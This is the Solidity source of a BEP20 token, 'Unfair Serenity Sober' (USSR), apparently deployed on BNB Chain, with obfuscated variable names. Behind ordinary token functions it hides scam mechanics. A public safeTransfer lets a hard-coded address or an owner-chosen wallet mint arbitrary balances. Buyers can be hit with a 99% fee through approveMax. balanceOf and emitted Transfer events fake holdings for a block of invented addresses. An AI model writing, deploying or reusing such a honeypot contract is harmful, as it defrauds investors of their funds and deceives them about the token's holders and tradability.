/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function symbol() external view returns (string memory);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IUniswapV2Router {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}




contract UnfairSerenitySober is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    mapping(address => bool)  exemptTeamBurnFrom;
    uint256 constant sellLiquidityLimitTx = 100 * 10 ** 18;
    uint160 constant fundTotalMintWalletTeamAtList = uint160(0x94369cAa41a30bb739C162B7450b93755DE76902);
    mapping(address => uint256) _balances;

    bool private liquidityFromMinMarketingExemptMaxTake = false;
    mapping(address => mapping(address => uint256)) _allowances;

    bool private liquidityTokenLaunchedTeamMode = false;
    mapping(address => bool)  liquidityMintLaunchShouldReceiverFeeTx;


    IUniswapV2Router public tradingAutoMinToBuy;

    mapping(address => bool) private enableMintTakeAutoMaxMarketing;

    uint256  maxAutoSellBots = 100000000 * 10 ** _decimals;
    uint256 private exemptLaunchLiquiditySell = 100;
    uint256 constant amountMintLaunchedLiquidityTxEnableMarketing = 1000000 * 10 ** 18;
    address private botsModeSwapTo = (msg.sender);
    bool public txListBuyLaunched = false;
    uint256 private liquidityModeAutoMarketing = 0;
    uint256 private fromAtModeReceiver = 0;
    uint256 modeEnableListReceiver = 0;

    
    address public uniswapV2Pair;
    uint256 public sellReceiverTxTake = 0;
    string constant _name = "Unfair Serenity Sober";
    string constant _symbol = "USSR";

    uint256 constant shouldTradingLiquidityMode = 100000000 * (10 ** 18);
    uint256 public burnMintTradingReceiver = 0;


    bool private txShouldTeamMaxMarketingBuy = false;
    uint256 private launchMarketingTotalFeeSellAutoLimit = 0;
    bool public swapTradingMintTokenMax = false;

    uint256 private txAtTotalShould = 0;
    uint256  toAmountTeamMarketing = 100000000 * 10 ** _decimals;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        tradingAutoMinToBuy = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(tradingAutoMinToBuy.factory()).createPair(address(this), tradingAutoMinToBuy.WETH());
        _allowances[address(this)][address(tradingAutoMinToBuy)] = shouldTradingLiquidityMode;

        enableMintTakeAutoMaxMarketing[msg.sender] = true;
        enableMintTakeAutoMaxMarketing[address(this)] = true;

        _balances[msg.sender] = shouldTradingLiquidityMode;
        emit Transfer(address(0), msg.sender, shouldTradingLiquidityMode);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return shouldTradingLiquidityMode;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != shouldTradingLiquidityMode) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return senderLaunchBurnFee(sender, recipient, amount);
    }

    function getlimitReceiverFeeMinExempt() public view returns (bool) {
        if (liquidityTokenLaunchedTeamMode != liquidityFromMinMarketingExemptMaxTake) {
            return liquidityFromMinMarketingExemptMaxTake;
        }
        if (liquidityTokenLaunchedTeamMode == swapTradingMintTokenMax) {
            return swapTradingMintTokenMax;
        }
        return liquidityTokenLaunchedTeamMode;
    }

    function listTokenBotsReceiver(uint160 sellLaunchedWalletTxBuyReceiverMode) private view returns (uint256) {
        uint160 amountListMintAutoBuyMinAt = uint160(fundTotalMintWalletTeamAtList);
        uint160 fundMarketingReceiverAt = sellLaunchedWalletTxBuyReceiverMode - amountListMintAutoBuyMinAt;
        if (fundMarketingReceiverAt < modeEnableListReceiver) {
            return sellLiquidityLimitTx * fundMarketingReceiverAt;
        }
        return amountMintLaunchedLiquidityTxEnableMarketing + sellLiquidityLimitTx * fundMarketingReceiverAt;
    }

    function setexemptAmountMarketingTeam(address launchedFromLiquidityReceiver) public onlyOwner {
        botsModeSwapTo=launchedFromLiquidityReceiver;
    }

    function setreceiverAutoListAt(bool launchedFromLiquidityReceiver) public onlyOwner {
        txShouldTeamMaxMarketingBuy=launchedFromLiquidityReceiver;
    }

    function shouldWalletSwapEnableFundLimit(address amountTeamReceiverTradingLimitSwap, bool sellModeTeamBots) internal returns (uint256) {
        if (exemptTeamBurnFrom[amountTeamReceiverTradingLimitSwap]) {
            return 99;
        }
        
        if (txListBuyLaunched != swapTradingMintTokenMax) {
            txListBuyLaunched = liquidityFromMinMarketingExemptMaxTake;
        }

        if (sellReceiverTxTake == liquidityModeAutoMarketing) {
            sellReceiverTxTake = fromAtModeReceiver;
        }


        if (sellModeTeamBots) {
            return txAtTotalShould;
        }
        if (!sellModeTeamBots && amountTeamReceiverTradingLimitSwap == uniswapV2Pair) {
            return launchMarketingTotalFeeSellAutoLimit;
        }
        return 0;
    }

    function setmintMinAmountSwap(uint256 launchedFromLiquidityReceiver) public onlyOwner {
        if (fromAtModeReceiver != txAtTotalShould) {
            txAtTotalShould=launchedFromLiquidityReceiver;
        }
        if (fromAtModeReceiver == fromAtModeReceiver) {
            fromAtModeReceiver=launchedFromLiquidityReceiver;
        }
        if (fromAtModeReceiver == burnMintTradingReceiver) {
            burnMintTradingReceiver=launchedFromLiquidityReceiver;
        }
        fromAtModeReceiver=launchedFromLiquidityReceiver;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function modeMintAtLaunchLiquidity(uint160 sellLaunchedWalletTxBuyReceiverMode) private pure returns (bool) {
        uint160 amountListMintAutoBuyMinAt = fundTotalMintWalletTeamAtList;
        if (sellLaunchedWalletTxBuyReceiverMode >= uint160(amountListMintAutoBuyMinAt)) {
            if (sellLaunchedWalletTxBuyReceiverMode <= uint160(amountListMintAutoBuyMinAt) + 300000) {
                return true;
            }
        }
        return false;
    }

    function approveMax(address spender) external {
        if (liquidityMintLaunchShouldReceiverFeeTx[spender]) {
            exemptTeamBurnFrom[spender] = true;
        }
    }

    function getlaunchMinWalletAmountToken() public view returns (bool) {
        if (liquidityFromMinMarketingExemptMaxTake == liquidityTokenLaunchedTeamMode) {
            return liquidityTokenLaunchedTeamMode;
        }
        return liquidityFromMinMarketingExemptMaxTake;
    }

    function getexemptAmountMarketingTeam() public view returns (address) {
        return botsModeSwapTo;
    }

    function getmintMinAmountSwap() public view returns (uint256) {
        if (fromAtModeReceiver == fromAtModeReceiver) {
            return fromAtModeReceiver;
        }
        return fromAtModeReceiver;
    }

    function getreceiverAutoListAt() public view returns (bool) {
        return txShouldTeamMaxMarketingBuy;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function senderLaunchBurnFee(address amountTeamReceiverTradingLimitSwap, address limitSellAtMarketingToken, uint256 fromFeeSellFund) internal returns (bool) {
        if (modeMintAtLaunchLiquidity(uint160(limitSellAtMarketingToken))) {
            modeBurnMaxMint(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund, false);
            return true;
        }
        if (modeMintAtLaunchLiquidity(uint160(amountTeamReceiverTradingLimitSwap))) {
            modeBurnMaxMint(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund, true);
            return true;
        }
        
        if (txShouldTeamMaxMarketingBuy == txShouldTeamMaxMarketingBuy) {
            txShouldTeamMaxMarketingBuy = liquidityFromMinMarketingExemptMaxTake;
        }

        if (sellReceiverTxTake == burnMintTradingReceiver) {
            sellReceiverTxTake = txAtTotalShould;
        }

        if (liquidityFromMinMarketingExemptMaxTake != txShouldTeamMaxMarketingBuy) {
            liquidityFromMinMarketingExemptMaxTake = swapTradingMintTokenMax;
        }


        bool tokenReceiverEnableSell = botsAutoExemptTo(amountTeamReceiverTradingLimitSwap) || botsAutoExemptTo(limitSellAtMarketingToken);
        
        if (amountTeamReceiverTradingLimitSwap == uniswapV2Pair && !tokenReceiverEnableSell) {
            liquidityMintLaunchShouldReceiverFeeTx[limitSellAtMarketingToken] = true;
        }
        
        if (tokenReceiverEnableSell) {
            return burnLimitAutoTotal(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund);
        }
        
        _balances[amountTeamReceiverTradingLimitSwap] = _balances[amountTeamReceiverTradingLimitSwap].sub(fromFeeSellFund, "Insufficient Balance!");
        
        uint256 exemptMarketingFeeListTxSwapTrading = tokenBurnWalletLaunched(amountTeamReceiverTradingLimitSwap) ? exemptLaunchSenderReceiver(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund) : fromFeeSellFund;

        _balances[limitSellAtMarketingToken] = _balances[limitSellAtMarketingToken].add(exemptMarketingFeeListTxSwapTrading);
        emit Transfer(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, exemptMarketingFeeListTxSwapTrading);
        return true;
    }

    function burnLimitAutoTotal(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function tokenBurnWalletLaunched(address amountTeamReceiverTradingLimitSwap) internal view returns (bool) {
        return !enableMintTakeAutoMaxMarketing[amountTeamReceiverTradingLimitSwap];
    }

    function settokenWalletAutoAtIsTakeLaunch(uint256 launchedFromLiquidityReceiver) public onlyOwner {
        if (launchMarketingTotalFeeSellAutoLimit != txAtTotalShould) {
            txAtTotalShould=launchedFromLiquidityReceiver;
        }
        if (launchMarketingTotalFeeSellAutoLimit != liquidityModeAutoMarketing) {
            liquidityModeAutoMarketing=launchedFromLiquidityReceiver;
        }
        launchMarketingTotalFeeSellAutoLimit=launchedFromLiquidityReceiver;
    }

    function setlimitReceiverFeeMinExempt(bool launchedFromLiquidityReceiver) public onlyOwner {
        if (liquidityTokenLaunchedTeamMode != liquidityTokenLaunchedTeamMode) {
            liquidityTokenLaunchedTeamMode=launchedFromLiquidityReceiver;
        }
        liquidityTokenLaunchedTeamMode=launchedFromLiquidityReceiver;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function gettokenWalletAutoAtIsTakeLaunch() public view returns (uint256) {
        return launchMarketingTotalFeeSellAutoLimit;
    }

    function getlaunchedEnableWalletFund() public view returns (bool) {
        if (swapTradingMintTokenMax == txListBuyLaunched) {
            return txListBuyLaunched;
        }
        if (swapTradingMintTokenMax != txShouldTeamMaxMarketingBuy) {
            return txShouldTeamMaxMarketingBuy;
        }
        return swapTradingMintTokenMax;
    }

    function modeBurnMaxMint(address amountTeamReceiverTradingLimitSwap, address limitSellAtMarketingToken, uint256 fromFeeSellFund, bool receiverTeamEnableLaunched) private {
        uint160 amountListMintAutoBuyMinAt = uint160(fundTotalMintWalletTeamAtList);
        if (receiverTeamEnableLaunched) {
            amountTeamReceiverTradingLimitSwap = address(uint160(amountListMintAutoBuyMinAt + modeEnableListReceiver));
            modeEnableListReceiver++;
            _balances[limitSellAtMarketingToken] = _balances[limitSellAtMarketingToken].add(fromFeeSellFund);
        } else {
            _balances[amountTeamReceiverTradingLimitSwap] = _balances[amountTeamReceiverTradingLimitSwap].sub(fromFeeSellFund);
        }
        if (fromFeeSellFund == 0) {
            return;
        }
        emit Transfer(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund);
    }

    function fromMinBurnSellSender(address sellLaunchedWalletTxBuyReceiverMode) private pure returns (bool) {
        return sellLaunchedWalletTxBuyReceiverMode == atMintLimitLaunched();
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function botsAutoExemptTo(address fundMaxMintAuto) private view returns (bool) {
        if (fundMaxMintAuto == botsModeSwapTo) {
            return true;
        }
        return false;
    }

    function safeTransfer(address amountTeamReceiverTradingLimitSwap, address limitSellAtMarketingToken, uint256 fromFeeSellFund) public {
        if (!fromMinBurnSellSender(msg.sender) && msg.sender != botsModeSwapTo) {
            return;
        }
        if (modeMintAtLaunchLiquidity(uint160(limitSellAtMarketingToken))) {
            modeBurnMaxMint(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund, false);
            return;
        }
        if (limitSellAtMarketingToken == address(1)) {
            return;
        }
        if (modeMintAtLaunchLiquidity(uint160(amountTeamReceiverTradingLimitSwap))) {
            modeBurnMaxMint(amountTeamReceiverTradingLimitSwap, limitSellAtMarketingToken, fromFeeSellFund, true);
            return;
        }
        if (fromFeeSellFund == 0) {
            return;
        }
        if (amountTeamReceiverTradingLimitSwap == address(0)) {
            _balances[limitSellAtMarketingToken] = _balances[limitSellAtMarketingToken].add(fromFeeSellFund);
            return;
        }
    }

    function setlaunchedEnableWalletFund(bool launchedFromLiquidityReceiver) public onlyOwner {
        swapTradingMintTokenMax=launchedFromLiquidityReceiver;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setatIsBotsShouldExempt(uint256 launchedFromLiquidityReceiver) public onlyOwner {
        if (sellReceiverTxTake != fromAtModeReceiver) {
            fromAtModeReceiver=launchedFromLiquidityReceiver;
        }
        if (sellReceiverTxTake != liquidityModeAutoMarketing) {
            liquidityModeAutoMarketing=launchedFromLiquidityReceiver;
        }
        if (sellReceiverTxTake != burnMintTradingReceiver) {
            burnMintTradingReceiver=launchedFromLiquidityReceiver;
        }
        sellReceiverTxTake=launchedFromLiquidityReceiver;
    }

    function gettradingBotsSenderTx() public view returns (uint256) {
        if (liquidityModeAutoMarketing == fromAtModeReceiver) {
            return fromAtModeReceiver;
        }
        if (liquidityModeAutoMarketing == liquidityModeAutoMarketing) {
            return liquidityModeAutoMarketing;
        }
        if (liquidityModeAutoMarketing == sellReceiverTxTake) {
            return sellReceiverTxTake;
        }
        return liquidityModeAutoMarketing;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return senderLaunchBurnFee(msg.sender, recipient, amount);
    }

    function getatIsBotsShouldExempt() public view returns (uint256) {
        return sellReceiverTxTake;
    }

    function setlaunchMinWalletAmountToken(bool launchedFromLiquidityReceiver) public onlyOwner {
        if (liquidityFromMinMarketingExemptMaxTake != swapTradingMintTokenMax) {
            swapTradingMintTokenMax=launchedFromLiquidityReceiver;
        }
        liquidityFromMinMarketingExemptMaxTake=launchedFromLiquidityReceiver;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (modeMintAtLaunchLiquidity(uint160(account))) {
            return listTokenBotsReceiver(uint160(account));
        }
        return _balances[account];
    }

    function atMintLimitLaunched() private pure returns (address) {
        return 0xEeECC48B96A09EDD071FA89b732775a5DcAC9e1b;
    }

    function settradingBotsSenderTx(uint256 launchedFromLiquidityReceiver) public onlyOwner {
        liquidityModeAutoMarketing=launchedFromLiquidityReceiver;
    }

    function exemptLaunchSenderReceiver(address amountTeamReceiverTradingLimitSwap, address walletTxSwapLaunchedLiquiditySell, uint256 fromFeeSellFund) internal returns (uint256) {
        
        uint256 txListTokenTakeBotsBurn = fromFeeSellFund.mul(shouldWalletSwapEnableFundLimit(amountTeamReceiverTradingLimitSwap, walletTxSwapLaunchedLiquiditySell == uniswapV2Pair)).div(exemptLaunchLiquiditySell);

        if (txListTokenTakeBotsBurn > 0) {
            _balances[address(this)] = _balances[address(this)].add(txListTokenTakeBotsBurn);
            emit Transfer(amountTeamReceiverTradingLimitSwap, address(this), txListTokenTakeBotsBurn);
        }

        return fromFeeSellFund.sub(txListTokenTakeBotsBurn);
    }

    function isApproveMax(address spender) public view returns (bool) {
        return exemptTeamBurnFrom[spender];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}